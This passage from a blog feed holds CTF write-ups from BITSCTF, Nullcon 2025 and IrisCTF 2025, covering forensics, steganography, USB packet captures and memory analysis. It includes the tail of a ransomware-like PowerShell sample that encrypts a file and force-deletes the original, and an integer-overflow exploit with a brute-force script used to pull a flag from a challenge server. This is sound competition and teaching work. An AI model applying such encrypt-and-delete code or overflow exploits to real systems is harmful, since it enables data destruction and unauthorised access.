class="line"><span class="variable">$cryptoStream</span>.Write(<span class="variable">$plainBytes</span>, <span class="number">0</span>, <span class="variable">$plainBytes</span>.Length)</span><br><span class="line"><span class="variable">$cryptoStream</span>.FlushFinalBlock()</span><br><span class="line"></span><br><span class="line"><span class="variable">$cryptoStream</span>.Close()</span><br><span class="line"><span class="variable">$outStream</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$inputFile</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>So we write a reversing script in order to decode the flag.enc and get back the flag.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span>.encode()</span><br><span class="line">salt = <span class="built_in">bytes</span>([<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>])</span><br><span class="line">iterations = <span class="number">10000</span></span><br><span class="line">key_size = <span class="number">32</span></span><br><span class="line">iv_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)</span><br><span class="line">key = key_iv[:key_size]</span><br><span class="line">iv = key_iv[key_size:key_size + iv_size]</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;flag.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data)</span><br><span class="line">pad_len = decrypted_data[-<span class="number">1</span>]</span><br><span class="line">decrypted_data = decrypted_data[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decryption successful: <span class="subst">&#123;output_file&#125;</span> restored.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/./images/flag.png" alt="Restored image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;h0pe_y0u_enj0yed_th1s_145e3f1a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> Steganography </tag>
            
            <tag> File Analysis </tag>
            
            <tag> DFIR </tag>
            
            <tag> RF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nullcon 2025</title>
      <link href="/2025/02/02/Nullcon-2025/"/>
      <url>/2025/02/02/Nullcon-2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in Nullcon 2025, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition.</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Ancient-Paper"><a href="#Ancient-Paper" class="headerlink" title="Ancient Paper"></a>Ancient Paper</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given an image file along the following description: “I found this ancient artifact stuck in an old machine labeled “29”. But what is its purpose?”</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>Initial inspection leads to the conclusion that the image is of an IBM-29 punch card which was carrying our flag as its data.<br><img src="/./images/ancient-paper.jpg" alt="Punch Card"></p><h4 id="Decoding-the-flag"><a href="#Decoding-the-flag" class="headerlink" title="Decoding the flag"></a>Decoding the flag</h4><p>Then I used the following mapping of the IBM-29 punch card to decode the data.</p><p><img src="/./images/digit_mapping.png" alt="Digits"><br><img src="/./images/alpha_mapping.png" alt="Alphabets"></p><p>Which lead to the following text:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1337 </span><span class="string">FORMAT</span> <span class="string">ENO</span> <span class="string">H0LL3R1TH</span> <span class="string">3NC0D3D</span> <span class="string">F0RTR4N</span> <span class="string">PRINT</span> <span class="number">1337</span></span><br></pre></td></tr></table></figure><p>And hence we get our flag as:</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;H0LL3R1TH_3NC0D3D_F0RTR4N&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Driving"><a href="#Driving" class="headerlink" title="Driving"></a>Driving</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a strange video (.mp4) of a “banana driving a Car xD”.</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>On extracting the frames of the video using the frames per second rates of 30 fps we get 387 frames.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i driving.mp4 -vf <span class="string">&quot;fps=30&quot;</span> frame_%04d.png</span><br></pre></td></tr></table></figure><p>Also the Artist in the video’s metadata looks like a hint for the challenge.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool driving.mp4</span><br><span class="line">ExifTool Version Number         : 12.40</span><br><span class="line">File Name                       : driving.mp4</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.2 MiB</span><br><span class="line">File Modification Date/Time     : 2025:02:01 14:06:53+05:30</span><br><span class="line">File Access Date/Time           : 2025:02:02 18:56:35+05:30</span><br><span class="line">File Inode Change Date/Time     : 2025:02:01 14:06:57+05:30</span><br><span class="line">File Permissions                : -rwxrwxrwx</span><br><span class="line">File Type                       : MP4</span><br><span class="line">File Type Extension             : mp4</span><br><span class="line">MIME Type                       : video/mp4</span><br><span class="line">Major Brand                     : MP4 v2 [ISO 14496-14]</span><br><span class="line">Minor Version                   : 0.0.0</span><br><span class="line">Compatible Brands               : mp42, mp41</span><br><span class="line">Movie Header Version            : 0</span><br><span class="line">Create Date                     : 2025:01:12 15:35:52</span><br><span class="line">Modify Date                     : 2025:01:12 15:35:52</span><br><span class="line">Time Scale                      : 90000</span><br><span class="line">Duration                        : 12.93 s</span><br><span class="line">Preferred Rate                  : 1</span><br><span class="line">Preferred Volume                : 100.00%</span><br><span class="line">Preview Time                    : 0 s</span><br><span class="line">Preview Duration                : 0 s</span><br><span class="line">Poster Time                     : 0 s</span><br><span class="line">Selection Time                  : 0 s</span><br><span class="line">Selection Duration              : 0 s</span><br><span class="line">Current Time                    : 0 s</span><br><span class="line">Next Track ID                   : 3</span><br><span class="line">Track Header Version            : 0</span><br><span class="line">Track Create Date               : 2025:01:12 15:35:52</span><br><span class="line">Track Modify Date               : 2025:01:12 15:35:52</span><br><span class="line">Track ID                        : 1</span><br><span class="line">Track Duration                  : 12.90 s</span><br><span class="line">Track Layer                     : 0</span><br><span class="line">Track Volume                    : 0.00%</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 480</span><br><span class="line">Graphics Mode                   : srcCopy</span><br><span class="line">Op Color                        : 0 0 0</span><br><span class="line">Compressor ID                   : hvc1</span><br><span class="line">Source Image Width              : 640</span><br><span class="line">Source Image Height             : 480</span><br><span class="line">X Resolution                    : 72</span><br><span class="line">Y Resolution                    : 72</span><br><span class="line">Compressor Name                 : HEVC Coding</span><br><span class="line">Bit Depth                       : 24</span><br><span class="line">Video Frame Rate                : 30</span><br><span class="line">Matrix Structure                : 1 0 0 0 1 0 0 0 1</span><br><span class="line">Media Header Version            : 0</span><br><span class="line">Media Create Date               : 2025:01:12 15:35:52</span><br><span class="line">Media Modify Date               : 2025:01:12 15:35:52</span><br><span class="line">Media Time Scale                : 44100</span><br><span class="line">Media Duration                  : 12.93 s</span><br><span class="line">Media Language Code             : eng</span><br><span class="line">Balance                         : 0</span><br><span class="line">Handler Description             : Alias Data Handler</span><br><span class="line">Audio Format                    : mp4a</span><br><span class="line">Audio Channels                  : 2</span><br><span class="line">Audio Bits Per Sample           : 16</span><br><span class="line">Audio Sample Rate               : 44100</span><br><span class="line">Handler Type                    : Metadata</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 13.00</span><br><span class="line">Artist                          : 2+(10*n) <span class="keyword">for</span> all n&gt;=10</span><br><span class="line">Media Data Size                 : 2271847</span><br><span class="line">Media Data Offset               : 12469</span><br><span class="line">Image Size                      : 640x480</span><br><span class="line">Megapixels                      : 0.307</span><br><span class="line">Avg Bitrate                     : 1.41 Mbps</span><br><span class="line">Rotation                        : 0</span><br></pre></td></tr></table></figure><p>Now on a simple inspection of the frames, one thing that catches our eye is the presence of <code>&#125;</code> in the frame number 383 (indexing from 1).</p><p><img src="/./images/frame_0383.png" alt="Frame 383"></p><p>Then by the Artist hint on inspecting frames on intervals of 10 i.e the following frames,<br><code>[103,113,123,133,143,153,163,173,183,193,203,213,223,233,243,253,263,273,283,293,303,313,323,333,343,353,363,373,383]</code><br>we find that each of those frames contain one character of the flag in the following order <code>Left Top → Right Top → Right Bottom → Left Bottom → Left Top…</code>, which leads us to our flag.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;Y0U_4R3_DR1V1N6_M3_CR4ZY&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Powerplay"><a href="#Powerplay" class="headerlink" title="Powerplay"></a>Powerplay</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>An interactive challenge where we are given the python code for the challenge and our job is to trick the server to reveal the flag.</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>On initial inspection of the code, we can find the vulnerability in it,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, quotes</span><br><span class="line"></span><br><span class="line">prizes = quotes + [<span class="string">&#x27;missingno&#x27;</span>] * <span class="number">4</span> + [flag] * <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!\n&#x27;</span>)</span><br><span class="line">player_count = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;How many players participate?\n&#x27;</span>))</span><br><span class="line">power = np.zeros(player_count, dtype = np.int32)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(player_count):</span><br><span class="line">power[i] = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&#x27;Player <span class="subst">&#123;i&#125;</span>, how strong are you right now?\n&#x27;</span>))</span><br><span class="line">ready = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;What do you want to do?\n1) pump up\n2) cash in&#x27;</span>)</span><br><span class="line">option = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">power = power**<span class="number">2</span></span><br><span class="line">ready = <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ready:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&#x27;Nope, too weak&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(player_count):</span><br><span class="line"><span class="keyword">if</span> power[i] &lt; <span class="built_in">len</span>(quotes):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;You got an inspiration: <span class="subst">&#123;prizes[power[i]]&#125;</span>&#x27;</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&#x27;What?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>The code creates the power as a numpy array of 32 bit signed integer type and then, the pump option lets us square the power array and the check is just if the power value is less than the length of quotes (positive) so one can cause integer overflow in power value to make it negative on squaring but there is one more catch that as the prizes has [flag]*24 we need to specifically make power in the range (-23 to -1) so that we bypass the check and acces the prizes array at an index where the flag is present which is one out of the last 24 cells, so we write a brute force script to get such a number.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">start = <span class="number">1000001</span></span><br><span class="line">end = <span class="number">100000000</span></span><br><span class="line">max_iter = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">lower_bound = -<span class="number">24</span></span><br><span class="line">upper_bound = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i = &#125;</span>&#x27;</span>)</span><br><span class="line">    a = np.int32(i)</span><br><span class="line">    ctr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ctr &lt; max_iter:</span><br><span class="line">        a = a ** <span class="number">2</span></span><br><span class="line">        ctr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a) &gt; lower_bound <span class="keyword">and</span> <span class="built_in">int</span>(a) &lt;= upper_bound:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: i = <span class="subst">&#123;i&#125;</span>, iterations = <span class="subst">&#123;ctr&#125;</span>, value = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>This gives first valid solution as <code>34716455 1 -15</code>, and on using this as our input we get our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our playground <span class="keyword">for</span> powerful people <span class="built_in">where</span> you can pump yourself up and get awesome prizes!</span><br><span class="line"></span><br><span class="line">How many players participate?</span><br><span class="line">1</span><br><span class="line">Player 0, how strong are you right now?</span><br><span class="line">34716455</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span>?</span><br><span class="line">1) pump up</span><br><span class="line">2) cash <span class="keyword">in</span></span><br><span class="line">1</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span>?</span><br><span class="line">1) pump up</span><br><span class="line">2) cash <span class="keyword">in</span></span><br><span class="line">2</span><br><span class="line">You got an inspiration: ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Profound-thought"><a href="#Profound-thought" class="headerlink" title="Profound thought"></a>Profound thought</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a .png file, and this happened to be the easiest challenge of the CTF.</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>A simple LSB steganography challenge, just use <code>zsteg</code> on the file and we get our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg l5b245c11.png</span><br><span class="line">imagedata           .. text: <span class="string">&quot;286-0.\t\n\t&quot;</span></span><br><span class="line">b1,r,lsb,xy         .. text: <span class="string">&quot;rzsZA&gt;FCNR^_]\&quot;&quot;</span></span><br><span class="line">b1,r,msb,xy         .. file: OpenPGP Public Key</span><br><span class="line">b1,g,msb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b1,rgb,lsb,xy       .. text: <span class="string">&quot;ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57&quot;</span></span><br><span class="line">b2,r,msb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b2,bgr,msb,xy       .. file: OpenPGP Public Key</span><br><span class="line">b3,r,msb,xy         .. file: RLE image data, 16888 x 4242, lower left corner: 8321, clear first, 16 color channels</span><br><span class="line">b4,r,lsb,xy         .. text: <span class="string">&quot;wYtE<span class="variable">$ER</span>\#<span class="variable">$DUEFuREEf2E</span>%5&quot;</span></span><br><span class="line">b4,g,lsb,xy         .. text: <span class="string">&quot;#\&quot;5DQ232UT2&quot;</span></span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125;</span></span><br></pre></td></tr></table></figure><h3 id="USBnet"><a href="#USBnet" class="headerlink" title="USBnet"></a>USBnet</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a packet capture of USB packtes.</p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>On initial analysis of the .pcapng in Wireshark we observe that packet 170 contains the <code>PNG</code> magic bytes of a .png image and it also has the <code>IEND</code> chunk meaning the complete image was transfered in this packet so we just try to recontruct the image from this packet using Cyberchef which gives the QR of our flag.</p><p><img src="/./images/Wireshark_nullcon.png" alt="Wireshark"></p><p><img src="/./images/Cyberchef.png" alt="Cyberchef"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;USB_ETHERNET_ADAPTER_ARE_COOL_N!C3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="abroad-study-notes"><a href="#abroad-study-notes" class="headerlink" title="abroad study notes"></a>abroad study notes</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a corrupted jpeg image which looks like its data streams are scratched.</p><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>Now from the JPEG documentation we find,<br>“If a 0xff byte occurs in the compressed image data either a zero byte (0x00) or a marker identifier follows it. Normally the only marker that should be found once the image data is started is an EOI. When a 0xff byte is found followed by a zero byte (0x00) the zero byte must be discarded.”<br>So on inspecting the given jpeg we find it has <code>ff 07</code> markers causing the distortion so we just fix them to <code>ff 00</code> and our jpeg restores to original one.</p><p><img src="/./images/nullcon_restored.jpg" alt="Final Image"></p><p>Documentation to refer: <a href="http://mcatutorials.com/mca-tutorials-jpeg-file-layout-format-2-c-practical.php">jpeg-format-layout</a></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;o7_t0_4ll_r3pl4c3d_07&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> Wireshark </tag>
            
            <tag> Steganography </tag>
            
            <tag> File Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IrisCTF-2025</title>
      <link href="/2025/01/07/irisctf2025/"/>
      <url>/2025/01/07/irisctf2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in IrisCTF 2025, organized by IrisSec, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some Forensics, Netwroking and RF challenges I was personally able to solve during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="deldeldel"><a href="#deldeldel" class="headerlink" title="deldeldel"></a>deldeldel</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall1.png" alt="Description"></p><p>Source File: <a href="/./files/deldeldel.tar.gz">deldeldel.tar.gz</a></p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We are give a packet capture file for this challenge. On viewing it in Wireshark a stream of USB packets can be discoverd.</p><p><img src="/./images/wireshark.png" alt="Wireshark"></p><p>The file name indicating a <code>keylogger</code> and the packets from ip 1.3.2 with Leftover Capture data that would be 8 byte strings made me believe for certain that its USB keyboard communicating with our host.</p><h4 id="Parsing-USB-CAP-Data"><a href="#Parsing-USB-CAP-Data" class="headerlink" title="Parsing USB CAP Data"></a>Parsing USB CAP Data</h4><p>I used the following online Keyboard parser tool to parse the HID data and hence retrieve the flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(https://github.com/5h4rrk/CTF-Usb_Keyboard_Parser/blob/main/Usb_Keyboard_Parser.py)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~$ python3 Usb_Keyboard_Parser.py klogger.pcapng</span><br><span class="line">[-] Found Modifier <span class="keyword">in</span> 310 packets [-]</span><br><span class="line"></span><br><span class="line">[+] Using filter <span class="string">&quot;usb.capdata&quot;</span> Retrived HID Data is :</span><br><span class="line"></span><br><span class="line">Hheey   AAalicce! Ii  tthink  Ii<span class="string">&#x27;&#x27;</span>m  ssupppooseed  too  giivee yoou   tiss fllaag:</span><br><span class="line"></span><br><span class="line">iriisctfF&#123;[tthis_akeyloggeer_iisS_too_hard_to_use&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;this_keylogger_is_too_hard_to_use&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Windy-Day"><a href="#Windy-Day" class="headerlink" title="Windy Day"></a>Windy Day</h3><h2 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p><img src="/./images/chall2.png" alt="Description"></p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a memory dump for this challenge. So we got to our beloved volatility for the analysis.</p><h4 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h4><p>I started analyzing the memdump.mem using <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a>.</p><p>The first step was as always listing the processes.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 